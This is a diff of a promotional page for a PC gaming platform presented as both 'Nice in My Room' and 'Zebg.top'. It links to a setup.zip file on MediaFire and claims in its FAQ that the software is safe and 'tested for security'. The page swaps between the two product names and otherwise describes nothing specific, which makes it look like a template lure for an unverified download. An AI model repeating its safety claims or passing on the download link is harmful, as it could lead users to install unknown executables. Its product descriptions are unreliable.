@@ -1,9 +1,9 @@
----
 
 ### **Nice in My Room – A Thrilling Gaming Hub for Desktop Gamers**  
 
 DOWNLOAD - [Nice in My Room](https://download1587.mediafire.com/4bogmjc0kligzeqHoyoaS1OtZuUPKwajtVcK6YI93jhvxMbocfsC5nRnzUls4f_0YLkCF4kqYwBvHufR74DZhLPuTapVDn1VuBpnGEbcde0GKUKWZALMDijAJo4f6lE6NCKiJBEJOtGfLcllTPCc2WmMhY24lz599TU0BY92pdmn/3l5gw32c2597fto/setup.zip)
 
+![image](https://github.com/user-attachments/assets/d4211dd4-8fed-4bce-aea9-a418f16424a4)---
 Are you looking for an immersive and diverse gaming platform on your PC? **Nice in My Room** brings an extensive library of exciting games, from strategic RPGs to engaging puzzles and creative simulations. Designed for smooth performance and high-quality gameplay, Zebg.top delivers an unparalleled gaming experience for desktop users.  
 
 #### **What is Nice in My Room PC?**  
@@ -33,7 +33,7 @@ Zebg.top is a versatile gaming platform optimized for PC, offering an array of p
 #### **Frequently Asked Questions (FAQ):**  
 ❓ **Is Nice in My Room PC free to play?** – Yes, the platform is free to download, with optional in-game purchases.  
 ❓ **Can I play offline?** – Some games support offline play, while others require an internet connection.  
-❓ **Is Zebg.top PC safe?** – Yes, all games are tested for security and optimized for smooth performance.  
+❓ **Is Nice in My Room PC safe?** – Yes, all games are tested for security and optimized for smooth performance.  
 
 🔥 **Ready to level up your gaming experience? Download Zebg.top PC today and explore a world of limitless entertainment!** 🎮  
 
